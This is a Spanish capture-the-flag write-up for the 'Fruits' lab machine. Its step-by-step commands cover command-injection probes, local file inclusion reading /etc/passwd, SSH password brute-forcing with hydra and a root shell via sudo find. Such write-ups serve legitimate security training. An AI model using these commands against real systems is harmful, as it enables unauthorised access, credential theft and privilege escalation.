# 🧨 Fruits -- The Hacker Labs Write‑Up

## 📌 Información General

-   **Nombre:** Fruits\
-   **Dificultad:** Easy / Beginner\
-   **IP Víctima:** 10.0.50.30\
-   **IP Atacante:** 10.0.50.4\
-   **Objetivo:** Obtener acceso inicial y escalar privilegios hasta
    root

------------------------------------------------------------------------

# 🔎 1. Reconocimiento

Comenzamos realizando un escaneo completo de puertos con Nmap:

``` bash
nmap -sC -sV -p- 10.0.50.30
```

## 📊 Resultados

    22/tcp open  ssh
    80/tcp open  http

### Servicios detectados

-   **SSH (22)** → Posible vector de acceso remoto\
-   **HTTP (80)** → Superficie principal de ataque

------------------------------------------------------------------------

# 🌐 2. Enumeración Web

Accedemos al servicio web:

    http://10.0.50.30

La página principal solo muestra un `index.html` sin información
relevante.

Al utilizar el buscador del sitio, la URL cambia a:

    /buscar.php?busqueda=apple

Endpoint interesante:

    /buscar.php

Parámetro potencialmente vulnerable:

    busqueda=

------------------------------------------------------------------------

# 🧪 3. Pruebas de Inyección

## ❌ Inyección de comandos

``` bash
; ls
| ls
$(ls)
`ls`
```

Sin resultado.

## ❌ LFI inicial

``` bash
../../../../etc/passwd
```

Sin éxito en `/buscar.php`.

------------------------------------------------------------------------

# 📁 4. Fuzzing de Directorios

``` bash
gobuster dir -u http://10.0.50.30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,js,json --no-error
```

## 🎯 Resultado interesante

    /fruits.php   (Size: 1)

El tamaño de **1 byte** sugiere que el archivo existe pero requiere
parámetros.

------------------------------------------------------------------------

# 🚨 5. Descubrimiento de LFI

    http://10.0.50.30/fruits.php?file=/etc/passwd

Se devuelve el contenido de `/etc/passwd`.

✔ Vulnerabilidad confirmada: **Local File Inclusion (LFI)**.

------------------------------------------------------------------------

# 🔎 6. Enumeración mediante LFI

La LFI permite:

-   Leer archivos del sistema\
-   Identificar usuarios válidos\
-   Revisar código fuente

Usuario identificado:

    bananaman

------------------------------------------------------------------------

# 🔐 7. Ataque SSH

``` bash
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://10.0.50.30 -t 4 -vV -w 10
```

## 🎯 Credenciales encontradas

-   **Usuario:** bananaman\
-   **Password:** celtic

------------------------------------------------------------------------

# 💻 8. Acceso Inicial

``` bash
ssh bananaman@10.0.50.30
```

Verificación:

``` bash
whoami
id
uname -a
ls -la
```

------------------------------------------------------------------------

# 🚀 9. Escalada de Privilegios

``` bash
sudo -l
```

Salida relevante:

    (ALL) NOPASSWD: /usr/bin/find

## 🔥 Explotación con GTFOBins

``` bash
sudo /usr/bin/find . -exec /bin/sh \;
```

Confirmación:

``` bash
whoami
```

Resultado:

    root

------------------------------------------------------------------------

## 📄 Alternativa: Leer root.txt

``` bash
sudo /usr/bin/find /root/root.txt -exec cat {} \;
```

------------------------------------------------------------------------

# 🏁 Conclusión

## 🔓 Cadena de Ataque

1.  Reconocimiento con Nmap\
2.  Enumeración web\
3.  Fuzzing → Descubrimiento de `/fruits.php`\
4.  Explotación de LFI\
5.  Obtención de usuario válido\
6.  Fuerza bruta SSH\
7.  Escalada mediante `sudo find`

------------------------------------------------------------------------

# 🧠 Lecciones Aprendidas

-   Un archivo con **size 1** puede ser clave.\
-   La LFI permite enumeración crítica del sistema.\
-   Siempre revisar `sudo -l`.\
-   GTFOBins es fundamental en CTFs.
